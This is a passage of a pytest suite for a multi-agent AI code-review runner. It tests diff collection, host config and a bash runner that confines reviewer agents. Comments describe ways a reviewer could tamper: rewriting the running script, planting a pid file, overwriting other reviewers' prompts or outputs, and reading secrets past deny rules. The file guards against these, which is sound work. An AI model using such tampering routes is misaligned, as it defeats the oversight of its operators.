    source = (REPO_ROOT / "scripts" / "review_until_converged.py").read_text()
    # The call, not the definition -- both start with the function's name.
    start = source.index("= _run_one_round(")
    return argument in source[start : source.index("\n        )", start)]


class TestChosenBase:
    """`--base`: review a range that is already on the trunk.

    Without it the base is always `origin/main`, which is right while the work
    is on a branch and wrong the moment it is pushed -- the merge-base diff
    goes empty, the fallback picks `HEAD~1`, and "review everything I did
    today" silently becomes "review the last commit".
    """

    def _repo(self, tmp_path: Path) -> Path:
        """Three commits on main, so a base can name each of them."""
        repo = tmp_path / "host"
        (repo / "app").mkdir(parents=True)
        subprocess.run(
            ["git", "init", "-q", "-b", "main"], cwd=repo, check=True, env=_GIT_ENV
        )
        for n, line in enumerate(["base", "first", "second"]):
            (repo / "app" / f"{line}.py").write_text(f"value = {n}\n")
            subprocess.run(["git", "add", "-A"], cwd=repo, check=True, env=_GIT_ENV)
            subprocess.run(
                ["git", "commit", "-q", "-m", line], cwd=repo, check=True, env=_GIT_ENV
            )
        return repo

    def _collect(self, repo: Path, round_dir: Path, *args: str) -> str:
        from unittest.mock import patch

        from scripts.review_loop.diff import collect_diff

        with patch("scripts.review_loop.diff.SCRIPTS_DIR", REPO_ROOT / "scripts"):
            diff_path, _n = collect_diff(round_dir, repo, *args)
        return diff_path.read_text()

    def test_a_named_base_reviews_everything_since_it(self, tmp_path: Path) -> None:
        repo = self._repo(tmp_path)
        round_dir = tmp_path / "round"
        round_dir.mkdir()
        diff = self._collect(repo, round_dir, "HEAD~2")
        assert "app/first.py" in diff
        assert "app/second.py" in diff

    def test_a_nearer_base_reviews_less(self, tmp_path: Path) -> None:
        """The point of naming one at all."""
        repo = self._repo(tmp_path)
        round_dir = tmp_path / "round"
        round_dir.mkdir()
        diff = self._collect(repo, round_dir, "HEAD~1")
        assert "app/second.py" in diff
        assert "app/first.py" not in diff

    def test_a_base_that_names_nothing_is_an_error(self, tmp_path: Path) -> None:
        """Not a fallback.

        A caller that named a base meant it, and quietly reviewing `HEAD~1`
        instead is how you end up believing something was reviewed that never
        was.
        """
        repo = self._repo(tmp_path)
        round_dir = tmp_path / "round"
        round_dir.mkdir()
        with pytest.raises(RuntimeError, match="does not name a commit"):
            self._collect(repo, round_dir, "no-such-ref")

    def test_an_empty_diff_against_a_named_base_stays_empty(self, tmp_path: Path) -> None:
        """"Nothing changed since there" is an answer, not a reason to review
        something else. The `HEAD~1` fallback is for the default base only.
        """
        repo = self._repo(tmp_path)
        round_dir = tmp_path / "round"
        round_dir.mkdir()
        assert self._collect(repo, round_dir, "HEAD").strip() == ""

    def test_the_default_is_unchanged(self, tmp_path: Path) -> None:
        """No `origin/main` here, so the default falls back to `HEAD~1` exactly
        as it did before this flag existed.
        """
        repo = self._repo(tmp_path)
        round_dir = tmp_path / "round"
        round_dir.mkdir()
        diff = self._collect(repo, round_dir)
        assert "app/second.py" in diff
        assert "app/first.py" not in diff

    def test_the_flag_reaches_the_round(self) -> None:
        """Threaded through by position; a missing argument would leave the
        default in place and review the wrong range without saying so.
        """
        source = (REPO_ROOT / "scripts" / "review_until_converged.py").read_text()
        assert '"--base"' in source
        assert "collect_diff(round_dir, repo, base)" in source
        assert _threaded_into_the_round("args.base")


class TestUntrackedFiles:
    """A file nobody has `git add`-ed yet is part of the working tree.

    `git diff` compares tracked files only, so a new module was absent from the
    review while the preflight counted it -- the reviewers were paid to read a
    branch with its most important file missing, and nothing said so.
    """

    def _repo(self, tmp_path: Path) -> Path:
        """Two commits on main, and a `.gitignore` that hides one name."""
        repo = tmp_path / "host"
        (repo / "app").mkdir(parents=True)
        subprocess.run(
            ["git", "init", "-q", "-b", "main"], cwd=repo, check=True, env=_GIT_ENV
        )
        (repo / ".gitignore").write_text("hidden.txt\n")
        for n, line in enumerate(["base", "last"]):
            (repo / "app" / f"{line}.py").write_text(f"value = {n}\n")
            subprocess.run(["git", "add", "-A"], cwd=repo, check=True, env=_GIT_ENV)
            subprocess.run(
                ["git", "commit", "-q", "-m", line], cwd=repo, check=True, env=_GIT_ENV
            )
        return repo

    def _collect(self, repo: Path, tmp_path: Path, *args: str) -> str:
        from unittest.mock import patch

        from scripts.review_loop.diff import collect_diff

        round_dir = tmp_path / "round"
        round_dir.mkdir()
        with patch("scripts.review_loop.diff.SCRIPTS_DIR", REPO_ROOT / "scripts"):
            diff_path, _n = collect_diff(round_dir, repo, *args)
        return diff_path.read_text()

    def test_a_new_file_nobody_added_is_reviewed(self, tmp_path: Path) -> None:
        repo = self._repo(tmp_path)
        (repo / "app" / "new.py").write_text("brand_new = True\n")
        diff = self._collect(repo, tmp_path, "HEAD")
        assert "app/new.py" in diff
        assert "+brand_new = True" in diff

    def test_an_ignored_file_stays_out(self, tmp_path: Path) -> None:
        repo = self._repo(tmp_path)
        (repo / "hidden.txt").write_text("not for reviewers\n")
        assert self._collect(repo, tmp_path, "HEAD").strip() == ""

    def test_an_untracked_vendored_file_stays_out(self, tmp_path: Path) -> None:
        """The pathspec that keeps the agent out of a host's review applies to
        new files as well as changed ones.
        """
        repo = self._repo(tmp_path)
        (repo / "scripts").mkdir()
        (repo / "scripts" / "review_preflight.py").write_text("# vendored\n")
        (repo / "app" / "mine.py").write_text("mine = 1\n")
        diff = self._collect(repo, tmp_path, "HEAD")
        assert "app/mine.py" in diff
        assert "review_preflight.py" not in diff

    def test_new_files_are_the_change_the_default_base_reviews(
        self, tmp_path: Path
    ) -> None:
        """With `origin/main` at HEAD the tracked diff is empty, which is when
        the default falls back to the last commit -- a pushed branch. New files
        mean there *is* work here, and it is what gets reviewed.
        """
        repo = self._repo(tmp_path)
        subprocess.run(
            ["git", "update-ref", "refs/remotes/origin/main", "HEAD"],
            cwd=repo,
            check=True,
            env=_GIT_ENV,
        )
        (repo / "app" / "new.py").write_text("brand_new = True\n")
        diff = self._collect(repo, tmp_path)
        assert "app/new.py" in diff
        assert "app/last.py" not in diff

    def test_with_nothing_new_the_default_still_falls_back(self, tmp_path: Path) -> None:
        """The other half, so the condition above is pinned both ways."""
        repo = self._repo(tmp_path)
        subprocess.run(
            ["git", "update-ref", "refs/remotes/origin/main", "HEAD"],
            cwd=repo,
            check=True,
            env=_GIT_ENV,
        )
        assert "app/last.py" in self._collect(repo, tmp_path)


class TestHostConfig:
    """A host project overriding SOURCE_DIRS without editing a vendored file.

    The comment on SOURCE_DIRS says "override this for monorepos" -- and
    `install.sh` copies the file, so any override is destroyed the next time
    the agent is re-vendored. Silently: the only symptom is a coverage gate
    that stops covering anything. A reviewer caught exactly that, on a
    monorepo whose code lives under `packages/*/src`.
    """

    def test_a_host_config_replaces_the_defaults(self, tmp_path: Path) -> None:
        import importlib
        import json

        from scripts.preflight import config as preflight_config

        (tmp_path / "review-config.json").write_text(
            json.dumps({"source_dirs": ["packages/", "services/"], "test_dirs": ["spec/"]}),
            encoding="utf-8",
        )
        with mock.patch.object(preflight_config, "HOST_CONFIG", tmp_path / "review-config.json"):
            assert preflight_config._dirs("source_dirs", ["src/"]) == [
                "packages/",
                "services/",
            ]
            assert preflight_config._dirs("test_dirs", ["tests/"]) == ["spec/"]
        importlib.reload(preflight_config)

    def test_no_host_config_keeps_the_defaults(self, tmp_path: Path) -> None:
        from scripts.preflight import config as preflight_config

        with mock.patch.object(preflight_config, "HOST_CONFIG", tmp_path / "absent.json"):
            assert preflight_config._dirs("source_dirs", ["src/"]) == ["src/"]

    @pytest.mark.parametrize(
        "body",
        [
            "{not json",
            "[]",
            '{"source_dirs": "packages/"}',
            '{"source_dirs": []}',
            '{"source_dirs": [7, "", null]}',
        ],
    )
    def test_an_unusable_host_config_keeps_the_defaults_and_says_so(
        self, tmp_path: Path, body: str, capsys: pytest.CaptureFixture[str]
    ) -> None:
        """A review that refuses to start over a stray comma is worse than one
        that runs with the defaults -- but silence is worse than either.

        A host writes this file precisely because the defaults do not cover its
        layout, so falling back to them without a word recreates the blind
        coverage gate the file exists to prevent.
        """
        from scripts.preflight import config as preflight_config

        where = tmp_path / "review-config.json"
        where.write_text(body, encoding="utf-8")
        with mock.patch.object(preflight_config, "HOST_CONFIG", where):
            assert preflight_config._dirs("source_dirs", ["src/"]) == ["src/"]
        assert "using the agent's defaults" in capsys.readouterr().err

    def test_an_absent_host_config_says_nothing(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        """Most projects do not have one, and that is not a problem."""
        from scripts.preflight import config as preflight_config

        with mock.patch.object(preflight_config, "HOST_CONFIG", tmp_path / "absent.json"):
            assert preflight_config._dirs("source_dirs", ["src/"]) == ["src/"]
        assert capsys.readouterr().err == ""

    def test_entries_that_are_not_strings_are_dropped(self, tmp_path: Path) -> None:
        from scripts.preflight import config as preflight_config

        where = tmp_path / "review-config.json"
        where.write_text('{"source_dirs": ["packages/", 7, "", null]}', encoding="utf-8")
        with mock.patch.object(preflight_config, "HOST_CONFIG", where):
            assert preflight_config._dirs("source_dirs", ["src/"]) == ["packages/"]


class TestVendoredPathsMatchInstaller:
    """VENDORED_PATHS is a hand-maintained mirror of install.sh. Pin it.

    If the installer starts copying a new file and this list is not updated,
    that file silently becomes part of every host project's review diff again.
    """

    def _installed_paths(self) -> set[str]:
        """The TARGET-relative paths install.sh writes."""
        installed: set[str] = set()
        for line in (REPO_ROOT / "install.sh").read_text().splitlines():
            line = line.strip()
            if not line.startswith(("cp ", "rsync ")):
                continue
            quoted = re.findall(r'"([^"]+)"', line)
            src = next((q for q in quoted if "$REPO_ROOT/" in q), None)
            dst = next((q for q in quoted if "$TARGET/" in q), None)
            if src is None or dst is None:
                continue
            rel_dst = dst.split("$TARGET/", 1)[1]
            # cp of a directory's contents ("src/.") fills the destination itself.
            contents = src.endswith("/.")
            if rel_dst.endswith("/") and not line.startswith("rsync ") and not contents:
                rel_dst += src.rsplit("/", 1)[-1]
            installed.add(rel_dst.rstrip("/"))
        return installed

    def test_no_drift_between_installer_and_exclusion_list(self) -> None:
        from scripts.review_loop.config import VENDORED_PATHS

        assert self._installed_paths() == set(VENDORED_PATHS)


class TestCodexEnvOverrides:
    """CODEX_MODEL and CODEX_REASONING_EFFORT pass through to codex exec."""

    # The two safety flags are always present, whatever the env says. A reviewer that can
    # edit the code it reviews breaks this tool's central promise, and `-s read-only` alone
    # is not enough: a global `approvals_reviewer = "auto_review"` overrides it.
    SAFETY = [
        "-s", "read-only", "-c", 'approvals_reviewer="user"',
        "-c", "project_doc_max_bytes=0", "-c", "notify=[]",
    ]  # fmt: skip

    def test_no_env_still_pins_the_safety_flags(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from scripts.review_loop.reviewers import _codex_extra_args

        monkeypatch.delenv("CODEX_MODEL", raising=False)
        monkeypatch.delenv("CODEX_REASONING_EFFORT", raising=False)
        assert _codex_extra_args() == self.SAFETY

    def test_env_cannot_drop_the_read_only_sandbox(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from scripts.review_loop.reviewers import _codex_extra_args

        # Even a user trying to widen the sandbox through the model knobs keeps read-only.
        monkeypatch.setenv("CODEX_MODEL", "gpt-5.5-codex")
        monkeypatch.setenv("CODEX_REASONING_EFFORT", "high")
        args = _codex_extra_args()
        assert args[:2] == ["-s", "read-only"]
        assert 'approvals_reviewer="user"' in args

    def test_model_env_adds_dash_m(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from scripts.review_loop.reviewers import _codex_extra_args

        monkeypatch.setenv("CODEX_MODEL", "gpt-5.5-codex")
        monkeypatch.delenv("CODEX_REASONING_EFFORT", raising=False)
        assert _codex_extra_args() == [*self.SAFETY, "-m", "gpt-5.5-codex"]

    def test_reasoning_high_is_pro_equivalent(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.review_loop.reviewers import _codex_extra_args

        monkeypatch.delenv("CODEX_MODEL", raising=False)
        monkeypatch.setenv("CODEX_REASONING_EFFORT", "high")
        # The bash equivalent is `-c model_reasoning_effort=high` and
        # matches what the ChatGPT web UI labels as "GPT-5.5 Pro".
        assert _codex_extra_args() == [*self.SAFETY, "-c", "model_reasoning_effort=high"]

    def test_both_env_vars_compose(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from scripts.review_loop.reviewers import _codex_extra_args

        monkeypatch.setenv("CODEX_MODEL", "gpt-5.5")
        monkeypatch.setenv("CODEX_REASONING_EFFORT", "high")
        args = _codex_extra_args()
        assert "-m" in args and "gpt-5.5" in args
        assert "-c" in args and "model_reasoning_effort=high" in args


class TestRunnerScript:
    """The runner in docs/ensemble-review.md section 6.

    THE DOC IS THE PROGRAM for full mode: the orchestrating agent reads that markdown and executes
    the bash out of it, so a regression there is a regression in the product with nothing to catch
    it. These tests extract the runner heredoc and check the properties that failed in the field.

    The failure they exist for: launch-with-& followed by `wait` used to sit in one foreground Bash
    tool call. That call is killed at its 120 second timeout while the reviewers, wrapped in
    `timeout 600`, survive detached. The orchestrator then had no results, no `wait` to return, and
    nothing that would ever wake it - it went idle and the round only moved when a human asked what
    had happened. It cost two rounds on a downstream project before the cause was found.
    """

    def test_the_runner_is_read_whole_before_it_runs(self, tmp_path: Path) -> None:
        # bash reads a script as it runs it: a reviewer that rewrote the file while it
        # ran had its commands run (measured). One group, closed by an exit, is read
        # whole first.
        runner = runner_script()
        code = [line for line in runner.splitlines() if not line.startswith("#")]
        assert code[0] == "{" and code[-2:] == ["exit 0", "}"]
        script = tmp_path / "s.sh"
        script.write_text(
            "{\nsleep 1\necho ran\nexit 0\n}\n" + "#" * 64 + "\n", encoding="utf-8"
        )
        proc = subprocess.Popen(
            ["bash", str(script)], stdout=subprocess.PIPE, text=True
        )
        time.sleep(0.3)
        with script.open("r+", encoding="utf-8") as f:
            f.write("{\nsleep 1\necho bad\nexit 0\n}\n")
        out, _ = proc.communicate(timeout=10)
        assert out == "ran\n"

    @pytest.mark.parametrize(
        ("files", "stops"),
        [
            ({"done-1": "0", "done-2": "0", "done-3": "0", "done-4": "0"}, False),
            ({"round.log": "x\nROUND COMPLETE\n"}, True),
            ({"runner-exit": "143"}, True),
        ],
    )
    def test_the_poll_waits_for_the_runner_not_the_reviewers(
        self, tmp_path: Path, files: dict[str, str], stops: bool
    ) -> None:
        # Four done-markers come before the outputs are published and extracted: a
        # poll that stopped on them read a half-made round.
        doc = AGENT_DOC.read_text()
        start = doc.index("deadline=$((SECONDS + 570))")
        poll = doc[start : doc.index("```", start)]
        poll = poll.replace("SECONDS + 570", "SECONDS + 2")
        poll = poll.replace("sleep 10", "sleep 0.2")
        for name, text in files.items():
            (tmp_path / name).write_text(text)
        started = time.monotonic()
        subprocess.run(
            ["bash", "-c", poll], env={**os.environ, "REVIEW_TMP": str(tmp_path)},
            capture_output=True, timeout=30,
        )  # fmt: skip
        assert (time.monotonic() - started < 1) == stops

    def test_launchers_read_private_copies_of_the_prompts(self) -> None:
        # From $REVIEW_TMP, a hermes reviewer already running with a file tool could
        # rewrite a later slot's prompt before it was read.
        runner = runner_script()
        copied = runner.index('cp -- "$REVIEW_TMP"/prompt-[1-4].txt "$PROMPT_DIR/"')
        launches = runner[runner.index("# R1: Security") :]
        assert copied < runner.index("# R1: Security")
        assert '"$REVIEW_TMP/prompt-' not in launches
        assert launches.count('"$PROMPT_DIR/prompt-') == 15

    def test_the_runners_private_directories_are_named_for_the_deny_rules(self) -> None:
        # Plain mktemp names (tmp.XXXX) were outside claude's mmcra-* deny rules.
        runner = runner_script()
        assert "mmcra-out-XXXXXXXX" in runner
        assert "make_scratch PROMPT_DIR mmcra-prompt-" in runner
        assert "//**/mmcra-out-*/**" in SECRET_READS
        assert "//**/mmcra-prompt-*/**" in SECRET_READS

    def test_cdpath_is_cleared_before_any_cd(self) -> None:
        # Set, it made "$(cd DIR && pwd -P)" capture cd's own line in the path.
        runner = runner_script()
        assert runner.index("unset CDPATH") < runner.index('(cd "')

    def test_runner_is_valid_bash(self, tmp_path: Path) -> None:
        script = tmp_path / "run-reviewers.sh"
        script.write_text(runner_script() + "\n")
        result = subprocess.run(
            ["bash", "-n", str(script)], capture_output=True, text=True, timeout=10
        )
        assert result.returncode == 0, f"runner does not parse: {result.stderr}"

    def test_launch_and_wait_live_in_the_same_script(self) -> None:
        # Both halves in one heredoc is the whole fix: `wait` and `kill -0` only work on children
        # of the shell that started them, and shell state does not survive between tool calls.
        runner = runner_script()
        assert "launch_cli" in runner and "launch_hermes" in runner
        assert "ROUND_DEADLINE" in runner
        assert "ROUND COMPLETE" in runner

    def test_the_doc_tells_the_agent_to_run_it_in_the_background(self) -> None:
        doc = AGENT_DOC.read_text()
        assert "run_in_background: true" in doc
        # And says why, so the next person to touch it does not "simplify" it back.
        assert "120 second timeout" in doc

    def test_waiting_is_bounded(self) -> None:
        # A bare `wait` has no deadline of its own, so one wedged reviewer holds the round open
        # forever and the other three results are never reported.
        runner = runner_script()
        assert "\nwait\n" not in runner, (
            "bare `wait` is back: one wedged reviewer hangs the round"
        )
        assert "WATCHDOG" in runner

    def test_every_reviewer_records_a_pid_and_an_exit_status(self) -> None:
        runner = runner_script()
        # Every launcher (hermes, claude, codex, gemini, agy) recording both is what makes
        # progress observable from another shell.
        assert runner.count('echo $! > "$REVIEW_TMP/pid-$num"') == 5
        # agy's records its status after cleanup, so it holds it in $rc first. In the
        # runner's private directory, and in $REVIEW_TMP for watching (mark_done).
        statuses = runner.count('mark_done "$num" $?; } &') + runner.count(
            'mark_done "$num" "$rc"; } &'
        )
        assert statuses == 5
        mark = shell_function(runner, "mark_done")
        assert '"$OUT_DIR/done-$1"' in mark and '"$REVIEW_TMP/done-$1"' in mark
        # The status must be written by the subshell that ran the reviewer. A separate waiter
        # cannot: `wait` refuses a pid that is not its own child, so it would record a bogus
        # status immediately while the reviewer was still running.
        # (The watchdog's `sleep 5 & wait $!` waits on its own sleep, not on a reviewer.)
        assert "wait $!" not in runner.replace("sleep 5 & wait $!", "")

    def test_reviewers_are_killable_as_a_tree(self) -> None:
        runner = runner_script()
        # `set -m` gives each background job its own process group; without it a reviewer CLI's
        # helper processes survive the round, still burning provider quota and still writing into
        # $REVIEW_TMP after the report is written.
        assert "\nset -m" in runner
        assert runner.count("kill_jobs 1 2 3 4") == 2  # interrupt, sweep
        assert runner.count('kill_jobs "$num"') == 1  # watchdog
        # SIGKILL escalation, because a CLI that traps SIGTERM otherwise outlives the round.
        # One per launcher, each staying in its job's process group (--foreground).
        assert runner.count('timeout --foreground -k 10 "$REVIEWER_TIMEOUT"') == 5
        assert "timeout -k" not in runner

    def test_what_is_killed_is_held_in_memory_not_read_from_a_file(self) -> None:
        # A reviewer can write in $REVIEW_TMP: a planted pid-N of 1 had the runner signal
        # every process the user owns.
        runner = runner_script()
        assert runner.count("JOB_PID[$num]=$!") == 5
        assert 'cat "$REVIEW_TMP/pid-' not in runner
        # pgrep only to ask whether a group is still this run's (live_group), and once
        # before that, whether it can.
        assert runner.count("pgrep -s") == 2
        assert 'pgrep -s 0 -g "$1"' in _liveness(runner)
        assert "if pgrep -s 0 -g 0 >/dev/null 2>&1 || [ $? -eq 1 ]; then" in runner

    @pytest.mark.parametrize("exits", [False, True], ids=["running", "exited"])
    @pytest.mark.parametrize("check", GROUP_CHECKS)
    def test_kill_jobs_reaches_everything_a_reviewer_started(
        self, tmp_path: Path, exits: bool, check: str
    ) -> None:
        # Plain timeout put itself in a process group of its own: a kill of the job's group
        # left the reviewer under it running, and a helper the reviewer left behind was out
        # of reach once timeout had exited. And with no pgrep to ask, every group read as
        # gone, and nothing was killed at all.
        runner = runner_script()
        kill_jobs = shell_function(runner, "kill_jobs") + _liveness(runner)
        then = "exit 0" if exits else "wait"
        script = tmp_path / "t.sh"
        script.write_text(
            f"set -m\nJOB_PID=()\nGROUP_CHECK={check}\n"
            + kill_jobs
            + "{ timeout --foreground -k 10 600 sh -c 'sleep 300 & echo $! > helper; "
            + then
            + "'; } &\n"
            "JOB_PID[1]=$!\n"
            "sleep 1\n"
            "kill_jobs 1\n"
            'kill -0 "$(cat helper)" 2>/dev/null && echo SURVIVED || echo GONE\n'
        )
        done = subprocess.run(
            ["bash", str(script)],
            cwd=tmp_path,
            capture_output=True,
            text=True,
            timeout=30,
        )
        assert done.stdout.strip() == "GONE", done.stdout + done.stderr

    def test_a_bedrock_pin_read_any_other_way_still_keeps_agy_out(self) -> None:
        # Only the string "true" pinned: "1" or "yes" let agy run for such a project.
        from scripts.review_loop import runner_cli

        seen: dict[str, bool] = {}

        def detect(verify_codex: bool, prefer_hermes: bool) -> dict[str, bool]:
            seen["pinned"] = prefer_hermes
            return {"agy": False}

        with mock.patch.object(runner_cli, "detect_backends", detect):
            for value in ("true", "1", "yes", "TRUE"):
                runner_cli._agy_detect(value)
                assert seen["pinned"], value
            runner_cli._agy_detect("false")
            assert not seen["pinned"]

    def test_agys_scratch_is_removed_or_named(self, tmp_path: Path) -> None:
        # The rm's failure said nothing, and a copy of agy's token could stay.
        runner = runner_script()
        locked = tmp_path / "locked"
        (locked / "inner").mkdir(parents=True)
        (locked / "inner").chmod(0o500)
        script = tmp_path / "t.sh"
        script.write_text(
            f"SCRATCH=({shlex.quote(str(locked))})\n"
            + shell_function(runner, "remove_scratch")
            + "remove_scratch\n"
            + 'rm() { :; }\nmkdir -p "${SCRATCH[0]}"\nremove_scratch\n'
        )
        done = subprocess.run(
            ["bash", str(script)], capture_output=True, text=True, timeout=30
        )
        # Made writable and removed; then, with rm made to fail, named.
        assert done.stdout.count("WARNING: could not remove") == 1, done.stdout
        assert "  remove_scratch\n" in shell_function(runner, "finish_round")

    @pytest.mark.parametrize("check", GROUP_CHECKS)
    def test_the_cleanup_kills_from_inside_its_trap(
        self, tmp_path: Path, check: str
    ) -> None:
        # live_group ended in a bare `return`, which in a trap returns the status from
        # before it -- the `exit 143` -- so an interrupted runner killed nothing.
        runner = runner_script()
        script = tmp_path / "t.sh"
        script.write_text(
            f"set -m\nJOB_PID=()\nGROUP_CHECK={check}\n"
            + shell_function(runner, "kill_jobs")
            + _liveness(runner)
            + "{ sleep 300; } &\nJOB_PID[1]=$!\necho $! > job\nsleep 0.3\n"
            + "trap 'kill_jobs 1' EXIT\ntrap 'exit 143' TERM\nkill -TERM $$\nsleep 5\n"
        )
        subprocess.run(["bash", str(script)], cwd=tmp_path, timeout=30)
        job = int((tmp_path / "job").read_text())
        time.sleep(0.3)
        alive = subprocess.run(["kill", "-0", str(job)], capture_output=True)
        if alive.returncode == 0:
            subprocess.run(["kill", "-KILL", "--", f"-{job}"])
        assert alive.returncode != 0, "the job outlived the runner's cleanup"

    @pytest.mark.skipif(not Path("/proc/self/stat").exists(), reason="needs /proc")
    def test_a_group_whose_name_holds_a_newline_is_found(self, tmp_path: Path) -> None:
        # Read a line at a time, its stat ended inside the name, and the group was
        # taken for gone: the cleanup left it running.
        runner = runner_script()
        named = (
            "import ctypes, time; "
            "ctypes.CDLL(None).prctl(15, b'help\\nname', 0, 0, 0); time.sleep(30)"
        )
        script = tmp_path / "t.sh"
        script.write_text(
            "set -m\n"
            + shell_function(runner, "session_groups")
            + f"exec {sys.executable} -c {shlex.quote(named)} &\nchild=$!\nsleep 0.5\n"
            + 'case "$(session_groups)" in *" $child "*) echo found ;; *) echo lost ;; esac\n'
            + "kill $child\n"
        )
        done = subprocess.run(
            ["bash", str(script)], capture_output=True, text=True, timeout=30
        )
        assert done.stdout.strip() == "found", done.stdout + done.stderr

    def test_a_second_signal_does_not_cut_the_cleanup_short(
        self, tmp_path: Path
    ) -> None:
        # The TERM trap's `exit` ran again inside the EXIT trap, ending the cleanup with
        # reviewers still running.
        runner = runner_script()
        script = tmp_path / "t.sh"
        script.write_text(
            "SCRATCH=()\n"
            # Stands in for the real sweep, with a second TERM arriving halfway.
            + "kill_jobs() { kill -TERM $$; sleep 0.3; echo CLEANED; }\n"
            + shell_function(runner, "finish_round")
            + "trap finish_round EXIT\ntrap 'exit 143' TERM\n"
            + "kill -TERM $$\nsleep 5\n"
        )
        done = subprocess.run(
            ["bash", str(script)], capture_output=True, text=True, timeout=30
        )
        assert done.stdout.strip() == "CLEANED", done.stdout + done.stderr
        assert done.returncode == 143

    def test_the_runner_says_it_needs_bash_4_4(self) -> None:
        # `mapfile -d` is 4.4's, and before it `set -u` failed on an empty array.
        runner = runner_script()
        assert "mapfile -d" in runner
        assert "the runner needs bash 4.4 or later" in runner

    def test_providers_are_counted_from_what_was_launched(self) -> None:
        # Predicted from what was installed, the count took in codex and Google for a
        # project pinned to Bedrock, where Hermes takes slots 2 and 3.
        runner = runner_script()
        # One per launcher, agy's by the family of the model it runs (three cases).
        assert runner.count("JOB_PROVIDER[$num]=") == 7
        assert "claude-*) JOB_PROVIDER[$num]=anthropic" in runner
        count = runner.index("N_PROVIDERS=$(printf '%s\\n' \"${JOB_PROVIDER[@]}\"")
        assert runner.index("# WATCHDOG") > count > runner.index("# R4: Spec-contract")
        assert "$HAS_CODEX && N_PROVIDERS" not in runner

    def test_codexs_answer_is_checked_like_the_others(self) -> None:
        # Written straight to result-N.json, it skipped the validation every other
        # reviewer's output gets -- which the loop gives it.
        runner = runner_script()
        assert '-o "$OUT_DIR/codex-out-$num.txt"' in runner
        assert '[ -f "$result" ] && continue' not in runner
        assert 'JOB_OUT[$num]="$REVIEW_TMP/codex-out-$num.txt"' in runner

    def test_reviewers_write_where_no_other_reviewer_writes(
        self, tmp_path: Path
    ) -> None:
        # Writing into $REVIEW_TMP, a reviewer with a file tool could overwrite another
        # slot's output while both ran. They write to OUT_DIR, published once all stop.
        runner = runner_script()
        start, end = runner.index("launch_hermes() {"), runner.index("# Pre-check")
        launchers = runner[start:end]
        assert '>"$REVIEW_TMP/' not in launchers and '-o "$REVIEW_TMP/' not in launchers
        sweep = runner[runner.index("# SWEEP.") : runner.index("# Post-process")]
        assert sweep.index("kill_jobs 1 2 3 4") < sweep.index("publish_outputs")
        script = tmp_path / "t.sh"
        tmp, out = tmp_path / "review", tmp_path / "out"
        tmp.mkdir()
        out.mkdir()
        (tmp / "codex-out-2.txt").write_text("planted")
        (tmp / "stdout-1.txt").write_text("planted")
        (out / "stdout-1.txt").write_text("real")
        script.write_text(
            f"REVIEW_TMP={shlex.quote(str(tmp))}\nOUT_DIR={shlex.quote(str(out))}\n"
            + shell_function(runner, "publish_outputs")
            + "publish_outputs\n"
        )
        subprocess.run(["bash", str(script)], check=True, timeout=30)
        assert (tmp / "stdout-1.txt").read_text() == "real"
        assert not (tmp / "codex-out-2.txt").exists()

    @pytest.mark.skipif(shutil.which("setsid") is None, reason="needs setsid")
    def test_the_runner_has_a_session_of_its_own(self, tmp_path: Path) -> None:
        # In the caller's session, a group number reused by another of its processes
        # passed live_group, and was signalled.
        runner = runner_script()
        start = runner.index('if [ -z "${MMCRA_OWN_SESSION:-}" ]')
        wrapper = runner[start : runner.index("\nfi\n", start) + 4]
        script = tmp_path / "t.sh"
        script.write_text(
            wrapper
            + 'echo "leader=$([ "$(ps -o sid= -p $$ | tr -d " ")" = "$$" ] && echo yes)"\n'
            + "trap 'echo got-TERM; exit 143' TERM\nsleep 20 >/dev/null & wait $!\n"
        )
        proc = subprocess.Popen(
            ["bash", str(script)], stdout=subprocess.PIPE, text=True
        )
        assert proc.stdout is not None
        assert proc.stdout.readline().strip() == "leader=yes"
        proc.terminate()  # to the outer runner, which forwards it
        rest, _ = proc.communicate(timeout=20)
        assert "got-TERM" in rest and proc.returncode == 143

    def test_the_runner_runs_a_copy_of_its_helpers(self) -> None:
        # A reviewer with a file tool can write the checkout, whose code the runner
        # ran after the reviewers had started.
        runner = runner_script()
        assert runner.index("HELPER_ROOT=") < runner.index("launch_cli 1")
        assert 'rm -rf -- "$HELPER_ROOT"' in shell_function(runner, "finish_round")

    def test_the_private_directory_is_absolute(self) -> None:
        # The agy job changes into its workspace before its redirections are opened: a
        # relative TMPDIR put its output, and its done marker, somewhere else.
        runner = runner_script()
        assert 'OUT_DIR="$(cd "$OUT_DIR" && pwd -P)"' in runner

    def test_outputs_that_could_not_be_published_are_kept_and_not_read(
        self, tmp_path: Path
    ) -> None:
        # A failed copy, and the cleanup removed the only copies; the extraction read
        # whatever was in $REVIEW_TMP under their names.
        runner = runner_script()
        tmp, out = tmp_path / "review", tmp_path / "out"
        tmp.mkdir()
        out.mkdir()
        (out / "stdout-1.txt").write_text("the only copy")
        start = runner.index("PUBLISHED=false")
        flags = runner[start : runner.index("publish_outputs() {")]
        script = tmp_path / "t.sh"
        script.write_text(
            f"REVIEW_TMP={shlex.quote(str(tmp))}\nOUT_DIR={shlex.quote(str(out))}\n"
            "SCRATCH=()\nkill_jobs() { :; }\n"
            + shell_function(runner, "remove_scratch")
            + flags
            + shell_function(runner, "publish_outputs")
            + shell_function(runner, "finish_round")
            + "cp() { return 1; }\n"
            + "publish_outputs || echo FAILED\nfinish_round\n"
            + 'echo "published=$PUBLISHED"\n'
        )
        done = subprocess.run(
            ["bash", str(script)], capture_output=True, text=True, timeout=30
        )
        assert "FAILED" in done.stdout and "published=false" in done.stdout
        assert f"kept in {out}" in done.stdout
        assert (out / "stdout-1.txt").read_text() == "the only copy"
        post = runner[runner.index("# Post-process") :]
        assert '$PUBLISHED && [ -n "$src" ]' in post

    def test_a_slot_is_read_only_from_its_own_clis_file(self, tmp_path: Path) -> None:
        # Every slot was read from codex-out-N.txt, then claude-raw-N.json, then
        # stdout, whichever existed first, and a result-N.json already there was kept:
        # a reviewer with a file tool could stand in for another slot.
        runner = runner_script()
        post = runner[runner.index("# Post-process") :]
        assert 'rm -rf -- "$result"' in post
        assert 'src="${JOB_OUT[$num]:-}"' in post
        assert "for src in" not in post
        assert runner.count("JOB_OUT[$num]=") == 5

    @pytest.mark.skipif(not Path("/proc/self/stat").exists(), reason="needs /proc")
